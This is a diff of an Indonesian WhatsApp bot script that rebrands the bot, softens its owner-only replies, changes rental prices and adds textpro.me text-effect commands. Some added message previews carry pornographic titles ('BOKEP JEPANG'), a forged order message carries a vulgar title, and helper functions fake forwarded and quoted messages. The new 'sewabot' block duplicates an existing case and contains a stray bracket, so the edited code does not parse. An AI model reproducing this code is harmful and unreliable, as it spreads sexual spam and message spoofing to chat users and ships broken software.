@@ -1,5 +1,5 @@
 /**
-   * Create By ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+   * Create By ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
    * Base by Kiki
 */
 
@@ -109,31 +109,31 @@ jobotz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title
 //=================================================//
 // Kontak
  const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${m.pushName}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${m.pushName},;;;\nFN:${m.pushName},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
-const bacito = (jid, text, quoted = fkontak) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const bacito = (jid, text, quoted = fkontak) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `BOKEP JEPANG ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 //=================================================//
 //GCLINK
 const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
-const bacit = (jid, text, quoted = fgclink) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const bacit = (jid, text, quoted = fgclink) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 //=================================================//
 //Document
 const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
-const bacot = (jid, text, quoted = fdoc) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const bacot = (jid, text, quoted = fdoc) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `Bokep Jepang ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 //=================================================//
 // VN 
 const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
-const thejo = (jid, text, quoted = fvn) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const thejo = (jid, text, quoted = fvn) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 //=================================================//
 //Lokasi
 const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
-const thejobot = (jid, text, quoted = floc) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const thejobot = (jid, text, quoted = floc) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 //=================================================//
 //Troli
 const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
-const review = (jid, text, quoted = ftroli) => botz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const review = (jid, text, quoted = ftroli) => botz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 //=================================================//
 //image
 const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
-const reply = (jid, text, quoted = ctlg) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
+const reply = (jid, text, quoted = ctlg) => jobotz.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ` }}}, { quoted })
 
 //=================================================//
 // Time & Date
@@ -476,7 +476,7 @@ const shield2 = {
     "imageMessage": {
         "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
         "mimetype": "image/jpeg",
-        "caption": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ X-MD",
+        "caption": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ X-MD",
         "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
         "fileLength": "28777",
         "height": 1080,
@@ -580,7 +580,7 @@ Waktu ${clockString(new Date - afkTime)}
 if (db.data.users[m.sender].afkTime > -1) {
 let user = global.db.data.users[m.sender]
 m.reply(`
-Hello Saya ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
+Hello Saya ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
 Selama ${clockString(new Date - user.afkTime)}
 `.trim())
 user.afkTime = -1
@@ -589,15 +589,15 @@ user.afkReason = ''
 	    
         switch(command) {
 	    case 'yuhu': {
-	            if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	            if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
-                m.reply(`${m.pushName} My Name ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${text ? ': ' + text : ''}`)
+                m.reply(`${m.pushName} My Name ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${text ? ': ' + text : ''}`)
             }
             break
 case 'hihi': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
@@ -697,10 +697,14 @@ Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
             }
             }
             break
-	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
-	    if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
-                jobotz.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/99hZyMy/qris.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➳ 13k Per Group via E-Walet 1 Month\n│➳ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➳ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6289653430712 (Owner)\n\nDonate For Me : \n\n│➳ saweria : https://www.saweria.com/kikiarr77\n│➳ Saweria : donasi` }, { quoted: m })
+	    case 'donasi': case 'sewabot': case 'buypremium': case 'donate': {
+	    if (!isCreator) return m.reply(`KHUSUS OWNER`)
+                jobotz.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/99hZyMy/qris.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➳ 13k Per Group via Gopay 1 Bulan\n│➳ 18k via pulsa 1 Bulan\n\n Premium Price Bot\n│➳ 8k per User 1 bulan\n\nPayment can be via Gopayl/Dana/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6289653430712 (Owner)\n\nDonate For Me : \n\n│➳ saweria : https://www.saweria.co/kikiarr77\n│➳ Saweria : donasi` }, { quoted: m })
             }
+            break
+case 'sewabot': {
+reply(`✿ HARGA SEWA DAN JUAL\n\n\n✥ Harga Sewa\n – 1 BULAN = Rp.15.000\n – 3 BULAN = Rp. 50.000\n\n✥ Harga Sewa Fitur Premium\n – 1 BULAN = Rp. 5.000\n – 3 BULAN = Rp. 15.000\n\n\n© KikiStore ✮`)
+]
             break
             case 'scgw': {
                 m.reply('Cari Script???\nAmbil di YouTube gweh \nhttps://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ')
@@ -886,14 +890,14 @@ Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
             }
             break
 case 'restart':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 await m.reply(`Restarting...`)
 exec(`cd && node index`)
 await sleep(4000)
 m.reply('Sukses')
 break
             case 'react': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 reactionMessage = {
                     react: {
                         text: args[0],
@@ -904,7 +908,7 @@ break
             }
             break  
             case 'join': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!text) throw 'Masukkan Link Group!'
                 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                 m.reply(mess.wait)
@@ -913,12 +917,12 @@ break
             }
             break
             case 'leave': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 await jobotz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
             }
             break
             case 'setexif': {
-               if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+               if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                if (!text) throw `Example : ${prefix + command} packname|author`
           global.packname = text.split("|")[0]
           global.author = text.split("|")[1]
@@ -926,7 +930,7 @@ break
             }
             break
 	case 'kick': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -935,7 +939,7 @@ break
 	}
 	break
 	case 'add': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -944,7 +948,7 @@ break
 	}
 	break
 	case 'promote': {
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -953,7 +957,7 @@ break
 	}
 	break
 	case 'demote': {
-	    if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	    if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 		if (!m.isGroup) throw mess.group
         if (!isBotAdmins) throw mess.botAdmin
         if (!isAdmins) throw mess.admin
@@ -972,7 +976,7 @@ break
 	}
 	break
 	    case 'setname': case 'setsubject': {
-	    if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	    if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -981,7 +985,7 @@ break
             }
             break
           case 'setdesc': case 'setdesk': {
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -990,7 +994,7 @@ break
             }
             break
           case 'setppbot': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -1000,7 +1004,7 @@ break
                 }
                 break
            case 'setppgroup': case 'setppgrup': case 'setppgc': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!m.isGroup) throw mess.group
                 if (!isAdmins) throw mess.admin
                 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -1012,7 +1016,7 @@ break
                 }
                 break
             case 'tagall': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!m.isGroup) throw mess.group
                 
 let teks = `══✪〘 👥 Tag All 〙✪══
@@ -1024,7 +1028,7 @@ let teks = `══✪〘 👥 Tag All 〙✪══
                 }
                 break
                 case 'hidetag': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
             if (!m.isGroup) throw mess.group
             jobotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
             }
@@ -1242,7 +1246,7 @@ break
             break
 
 case 'autoread':
-	if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 	if (args[0] == 'on') {
 		if (autoread) return m.reply('*Sudah aktif!*')
 		autoread = true
@@ -1519,7 +1523,7 @@ break
 	    }
 	    break
 	       case 'attp2': case 'ttp': {
-	       if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+	       if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
            if (!text) throw `Example : ${prefix + command} text`
            await jobotz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'kibotz', 'yuumei', m, {asSticker: true})
 
@@ -1887,12 +1891,82 @@ break
                 jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
-                if (!text) throw `Example : ${prefix + command} text`
+        
+case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
+case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
+case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
+case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
+case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
+case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
+ case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
+case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
+case 'lava': case 'rock': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
+ case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
+             if (!q) return reply(`Contoh : ${prefix + command} text`)    
+              if (!text) throw 'No Query Text'
                 m.reply(mess.wait)
-                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
-	    }
-            break
+             let link
+             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
+             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
+             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
+             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
+             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
+             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
+             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
+             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
+             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
+             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
+             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
+             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
+             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
+             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
+             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
+             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
+             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
+             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
+             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
+             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
+             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
+             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
+             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
+             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
+             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
+             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
+             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
+             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
+             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
+             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
+             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
+             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
+             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
+             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
+             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
+             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
+             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
+             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
+             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
+             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
+             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
+             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
+             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
+             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
+             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
+             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
+             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
+             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
+             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
+             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
+             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
+             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
+             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
+             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
+             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
+             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
+                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
+             let anu = await maker.textpro(link, q)
+                jobotz.sendMessage(m.chat, { image: { url: anu }, caption: `Dibuat oleh Kiki Ori` }, { quoted: m })
+             }
+             break
 	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                 if (!text) throw 'No Query Text'
                 m.reply(mess.wait)
@@ -2939,27 +3013,7 @@ let capt = `│➳ Title: ${judul}
 case 'menu': {
 menunya = `
 Hai Kak ${m.pushName}
-░░░░░░░░░░▄▄▄▄▄▄▄░░░░░░░░░░
-░░░░░░▄▄▀▀░░░░░░░▀▀▄▄░░░░░░
-░░░░▄▀░░░░░░░░░░░░░░░▀▄░░░░
-░░░▄▀░░░▄▄▄▄▄▄▄▄▄▄▄░░░░█░░░
-░░█░░▄███████████████▄░░█░░
-░█░░▄██▀░▄▄▀███▀▄▄░▀███░░█░
-░█░░▀█████████████████▀░░█░
-░█░░░░▀▀████████████▀░░░░█░
-░░█░░░░░░░░▀▀▀▀▀░░░░░░░▄▀░░
-░░░▀▀▄▄▄▄░░░░░░░░░▄▄▄▀▀░░░░
-░░▄██▀▄▄▄█▀▀▀▀▀▀▀█▄▄▄▀██▄░░
-░▄▀██░░░░░▀▀▀▀▀▀▀░░░░░██▀▄░
-█░░██░░░░░░░░░░░░░░░░░██░░█
-█░░██░░░░░░░░░░░░░░░░░██░░█
-█░░██░░░░░░░░░░░░░░░░░██░░█
-█░░██░░░░░░░░░░░░░░░░░██░░█
-█░░██░░░░░░░░░░░░░░░░░██░░█
-█░░██▄░░░░░░░░░░░░░░░▄██░░█
-▀▀▄█░█▄▄▄▄░░░░░░░▄▄▄▄█░█▄▀▀
-░░░░░░░░░█▄▄▄▄▄▄▄█░░░░░░░░░
-░░░░░░░░░░░░░░░░░░░░░░░░░░░
+
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 
 *NOTE*
@@ -3000,7 +3054,7 @@ Thank you I hope you can understand it.
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© Powered by: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© Powered by: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -3371,42 +3425,115 @@ need help?, bot report broken or not working?
 │➳ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
 ╰━═════════════━•
 •━══❴ ㅊ ❈ Sana BOT ✯ KIKI ORIㅊ ❈ ❵══━• 
-╭━═════════════━• 
-│ 〘 TEKS PRO MENU 〙
-╰━═════════════━• 
-╭━═════════════━•
-│➳ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
-│➳ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
-│➳ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
-│➳ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
-│➳ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
-│➳ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
